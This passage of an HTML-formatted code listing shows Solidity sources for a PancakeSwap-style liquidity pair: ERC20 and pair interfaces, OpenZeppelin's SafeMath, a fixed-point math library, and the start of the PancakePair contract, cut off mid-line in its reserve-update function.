class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IPancakePair &#123;</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint value);</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint value);</span><br><span class="line"></span><br><span class="line">    function name() external pure returns (string memory);</span><br><span class="line">    function symbol() external pure returns (string memory);</span><br><span class="line">    function decimals() external pure returns (uint8);</span><br><span class="line">    function totalSupply() external view returns (uint);</span><br><span class="line">    function balanceOf(address owner) external view returns (uint);</span><br><span class="line">    function allowance(address owner, address spender) external view returns (uint);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint value) external returns (bool);</span><br><span class="line">    function transfer(address to, uint value) external returns (bool);</span><br><span class="line">    function transferFrom(address from, address to, uint value) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function DOMAIN_SEPARATOR() external view returns (bytes32);</span><br><span class="line">    function PERMIT_TYPEHASH() external pure returns (bytes32);</span><br><span class="line">    function nonces(address owner) external view returns (uint);</span><br><span class="line"></span><br><span class="line">    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;</span><br><span class="line"></span><br><span class="line">    event Mint(address indexed sender, uint amount0, uint amount1);</span><br><span class="line">    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);</span><br><span class="line">    event Swap(</span><br><span class="line">        address indexed sender,</span><br><span class="line">        uint amount0In,</span><br><span class="line">        uint amount1In,</span><br><span class="line">        uint amount0Out,</span><br><span class="line">        uint amount1Out,</span><br><span class="line">        address indexed to</span><br><span class="line">    );</span><br><span class="line">    event Sync(uint112 reserve0, uint112 reserve1);</span><br><span class="line"></span><br><span class="line">    function MINIMUM_LIQUIDITY() external pure returns (uint);</span><br><span class="line">    function factory() external view returns (address);</span><br><span class="line">    function token0() external view returns (address);</span><br><span class="line">    function token1() external view returns (address);</span><br><span class="line">    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);</span><br><span class="line">    function price0CumulativeLast() external view returns (uint);</span><br><span class="line">    function price1CumulativeLast() external view returns (uint);</span><br><span class="line">    function kLast() external view returns (uint);</span><br><span class="line"></span><br><span class="line">    function mint(address to) external returns (uint liquidity);</span><br><span class="line">    function burn(address to) external returns (uint amount0, uint amount1);</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;</span><br><span class="line">    function skim(address to) external;</span><br><span class="line">    function sync() external;</span><br><span class="line"></span><br><span class="line">    function initialize(address, address) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">        /**</span><br><span class="line">     * @dev Returns the amount of tokens in existence.</span><br><span class="line">     */</span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the amount of tokens owned by `account`.</span><br><span class="line">     */</span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Moves `amount` tokens from the caller&#x27;s account to `to`.</span><br><span class="line">     *</span><br><span class="line">     * Returns a boolean value indicating whether the operation succeeded.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function transfer(address to, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the remaining number of tokens that `spender` will be</span><br><span class="line">     * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is</span><br><span class="line">     * zero by default.</span><br><span class="line">     *</span><br><span class="line">     * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called.</span><br><span class="line">     */</span><br><span class="line">    function allowance(address owner, address spender) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Sets `amount` as the allowance of `spender` over the caller&#x27;s tokens.</span><br><span class="line">     *</span><br><span class="line">     * Returns a boolean value indicating whether the operation succeeded.</span><br><span class="line">     *</span><br><span class="line">     * IMPORTANT: Beware that changing an allowance with this method brings the risk</span><br><span class="line">     * that someone may use both the old and the new allowance by unfortunate</span><br><span class="line">     * transaction ordering. One possible solution to mitigate this race</span><br><span class="line">     * condition is to first reduce the spender&#x27;s allowance to 0 and set the</span><br><span class="line">     * desired value afterwards:</span><br><span class="line">     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span><br><span class="line">     *</span><br><span class="line">     * Emits an &#123;Approval&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Moves `amount` tokens from `from` to `to` using the</span><br><span class="line">     * allowance mechanism. `amount` is then deducted from the caller&#x27;s</span><br><span class="line">     * allowance.</span><br><span class="line">     *</span><br><span class="line">     * Returns a boolean value indicating whether the operation succeeded.</span><br><span class="line">     *</span><br><span class="line">     * Emits a &#123;Transfer&#125; event.</span><br><span class="line">     */</span><br><span class="line">    function transferFrom(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) external returns (bool);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Emitted when `value` tokens are moved from one account (`from`) to</span><br><span class="line">     * another (`to`).</span><br><span class="line">     *</span><br><span class="line">     * Note that `value` may be zero.</span><br><span class="line">     */</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Emitted when the allowance of a `spender` for an `owner` is set by</span><br><span class="line">     * a call to &#123;approve&#125;. `value` is the new allowance.</span><br><span class="line">     */</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="PancakeSwap-sol"><a href="#PancakeSwap-sol" class="headerlink" title="PancakeSwap.sol"></a>PancakeSwap.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)</span><br><span class="line"></span><br><span class="line">// CAUTION</span><br><span class="line">// This version of SafeMath should only be used with Solidity 0.8 or later,</span><br><span class="line">// because it relies on the compiler&#x27;s built in overflow checks.</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Wrappers over Solidity&#x27;s arithmetic operations.</span><br><span class="line"> *</span><br><span class="line"> * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler</span><br><span class="line"> * now has built in overflow checking.</span><br><span class="line"> */</span><br><span class="line">library SafeMath &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the addition of two unsigned integers, with an overflow flag.</span><br><span class="line">     *</span><br><span class="line">     * _Available since v3.4._</span><br><span class="line">     */</span><br><span class="line">    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            uint256 c = a + b;</span><br><span class="line">            if (c &lt; a) return (false, 0);</span><br><span class="line">            return (true, c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the substraction of two unsigned integers, with an overflow flag.</span><br><span class="line">     *</span><br><span class="line">     * _Available since v3.4._</span><br><span class="line">     */</span><br><span class="line">    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            if (b &gt; a) return (false, 0);</span><br><span class="line">            return (true, a - b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.</span><br><span class="line">     *</span><br><span class="line">     * _Available since v3.4._</span><br><span class="line">     */</span><br><span class="line">    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            // Gas optimization: this is cheaper than requiring &#x27;a&#x27; not being zero, but the</span><br><span class="line">            // benefit is lost if &#x27;b&#x27; is also tested.</span><br><span class="line">            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522</span><br><span class="line">            if (a == 0) return (true, 0);</span><br><span class="line">            uint256 c = a * b;</span><br><span class="line">            if (c / a != b) return (false, 0);</span><br><span class="line">            return (true, c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the division of two unsigned integers, with a division by zero flag.</span><br><span class="line">     *</span><br><span class="line">     * _Available since v3.4._</span><br><span class="line">     */</span><br><span class="line">    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            if (b == 0) return (false, 0);</span><br><span class="line">            return (true, a / b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.</span><br><span class="line">     *</span><br><span class="line">     * _Available since v3.4._</span><br><span class="line">     */</span><br><span class="line">    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            if (b == 0) return (false, 0);</span><br><span class="line">            return (true, a % b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the addition of two unsigned integers, reverting on</span><br><span class="line">     * overflow.</span><br><span class="line">     *</span><br><span class="line">     * Counterpart to Solidity&#x27;s `+` operator.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - Addition cannot overflow.</span><br><span class="line">     */</span><br><span class="line">    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        return a + b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the subtraction of two unsigned integers, reverting on</span><br><span class="line">     * overflow (when the result is negative).</span><br><span class="line">     *</span><br><span class="line">     * Counterpart to Solidity&#x27;s `-` operator.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - Subtraction cannot overflow.</span><br><span class="line">     */</span><br><span class="line">    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        return a - b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the multiplication of two unsigned integers, reverting on</span><br><span class="line">     * overflow.</span><br><span class="line">     *</span><br><span class="line">     * Counterpart to Solidity&#x27;s `*` operator.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - Multiplication cannot overflow.</span><br><span class="line">     */</span><br><span class="line">    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        return a * b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the integer division of two unsigned integers, reverting on</span><br><span class="line">     * division by zero. The result is rounded towards zero.</span><br><span class="line">     *</span><br><span class="line">     * Counterpart to Solidity&#x27;s `/` operator.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - The divisor cannot be zero.</span><br><span class="line">     */</span><br><span class="line">    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        return a / b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),</span><br><span class="line">     * reverting when dividing by zero.</span><br><span class="line">     *</span><br><span class="line">     * Counterpart to Solidity&#x27;s `%` operator. This function uses a `revert`</span><br><span class="line">     * opcode (which leaves remaining gas untouched) while Solidity uses an</span><br><span class="line">     * invalid opcode to revert (consuming all remaining gas).</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - The divisor cannot be zero.</span><br><span class="line">     */</span><br><span class="line">    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        return a % b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on</span><br><span class="line">     * overflow (when the result is negative).</span><br><span class="line">     *</span><br><span class="line">     * CAUTION: This function is deprecated because it requires allocating memory for the error</span><br><span class="line">     * message unnecessarily. For custom revert reasons use &#123;trySub&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Counterpart to Solidity&#x27;s `-` operator.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - Subtraction cannot overflow.</span><br><span class="line">     */</span><br><span class="line">    function sub(</span><br><span class="line">        uint256 a,</span><br><span class="line">        uint256 b,</span><br><span class="line">        string memory errorMessage</span><br><span class="line">    ) internal pure returns (uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            require(b &lt;= a, errorMessage);</span><br><span class="line">            return a - b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the integer division of two unsigned integers, reverting with custom message on</span><br><span class="line">     * division by zero. The result is rounded towards zero.</span><br><span class="line">     *</span><br><span class="line">     * Counterpart to Solidity&#x27;s `/` operator. Note: this function uses a</span><br><span class="line">     * `revert` opcode (which leaves remaining gas untouched) while Solidity</span><br><span class="line">     * uses an invalid opcode to revert (consuming all remaining gas).</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - The divisor cannot be zero.</span><br><span class="line">     */</span><br><span class="line">    function div(</span><br><span class="line">        uint256 a,</span><br><span class="line">        uint256 b,</span><br><span class="line">        string memory errorMessage</span><br><span class="line">    ) internal pure returns (uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            require(b &gt; 0, errorMessage);</span><br><span class="line">            return a / b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),</span><br><span class="line">     * reverting with custom message when dividing by zero.</span><br><span class="line">     *</span><br><span class="line">     * CAUTION: This function is deprecated because it requires allocating memory for the error</span><br><span class="line">     * message unnecessarily. For custom revert reasons use &#123;tryMod&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Counterpart to Solidity&#x27;s `%` operator. This function uses a `revert`</span><br><span class="line">     * opcode (which leaves remaining gas untouched) while Solidity uses an</span><br><span class="line">     * invalid opcode to revert (consuming all remaining gas).</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - The divisor cannot be zero.</span><br><span class="line">     */</span><br><span class="line">    function mod(</span><br><span class="line">        uint256 a,</span><br><span class="line">        uint256 b,</span><br><span class="line">        string memory errorMessage</span><br><span class="line">    ) internal pure returns (uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            require(b &gt; 0, errorMessage);</span><br><span class="line">            return a % b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">library UQ112x112 &#123;</span><br><span class="line">    uint224 constant Q112 = 2**112;</span><br><span class="line"></span><br><span class="line">    // encode a uint112 as a UQ112x112</span><br><span class="line">    function encode(uint112 y) internal pure returns (uint224 z) &#123;</span><br><span class="line">        z = uint224(y) * Q112; // never overflows</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // divide a UQ112x112 by a uint112, returning a UQ112x112</span><br><span class="line">    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) &#123;</span><br><span class="line">        z = x / uint224(y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IPancakeCallee &#123;</span><br><span class="line">    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PancakePair &#123;</span><br><span class="line">    using SafeMath  for uint;</span><br><span class="line">    using UQ112x112 for uint224;</span><br><span class="line"></span><br><span class="line">    uint public constant MINIMUM_LIQUIDITY = 10**3;</span><br><span class="line">    bytes4 private constant SELECTOR = bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;)));</span><br><span class="line"></span><br><span class="line">    address public factory;</span><br><span class="line">    address public token0;</span><br><span class="line">    address public token1;</span><br><span class="line"></span><br><span class="line">    uint112 private reserve0;           // uses single storage slot, accessible via getReserves</span><br><span class="line">    uint112 private reserve1;           // uses single storage slot, accessible via getReserves</span><br><span class="line">    uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves</span><br><span class="line"></span><br><span class="line">    uint public price0CumulativeLast;</span><br><span class="line">    uint public price1CumulativeLast;</span><br><span class="line">    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event</span><br><span class="line"></span><br><span class="line">    uint public unlocked = 1;</span><br><span class="line">    modifier lock() &#123;</span><br><span class="line">        require(unlocked == 1, &#x27;Pancake: LOCKED&#x27;);</span><br><span class="line">        unlocked = 0;</span><br><span class="line">        _;</span><br><span class="line">        unlocked = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) &#123;</span><br><span class="line">        _reserve0 = reserve0;</span><br><span class="line">        _reserve1 = reserve1;</span><br><span class="line">        _blockTimestampLast = blockTimestampLast;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _safeTransfer(address token, address to, uint value) private &#123;</span><br><span class="line">        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));</span><br><span class="line">        require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), &#x27;Pancake: TRANSFER_FAILED&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Mint(address indexed sender, uint amount0, uint amount1);</span><br><span class="line">    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);</span><br><span class="line">    event Swap(</span><br><span class="line">        address indexed sender,</span><br><span class="line">        uint amount0In,</span><br><span class="line">        uint amount1In,</span><br><span class="line">        uint amount0Out,</span><br><span class="line">        uint amount1Out,</span><br><span class="line">        address indexed to</span><br><span class="line">    );</span><br><span class="line">    event Sync(uint112 reserve0, uint112 reserve1);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        factory = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // called once by the factory at time of deployment</span><br><span class="line">    function initialize(address _token0, address _token1) external &#123;</span><br><span class="line">        require(msg.sender == factory, &#x27;Pancake: FORBIDDEN&#x27;); // sufficient check</span><br><span class="line">        token0 = _token0;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // update reserves and, on the first call per block, price accumulators</span><br><span class="line">    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;</span><br><span class="line">        require(balance0 &lt;= type(uint112).max &amp;&amp; balance1 &lt;= type(uint112).max, &#x27;Pancake: OVERFLOW&#x27;);</span><br><span class="line">        uint32 blockTimestamp = uint32(block.timestamp % 2**32);</span><br><span class="line">        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired</span><br><span class="line">        if (timeElapsed &gt; 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;</span><br><span class="line">            // * never overflows, and + overflow is desired</span><br><span class="line">            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;</span><br><span class="line">            price1CumulativeLast 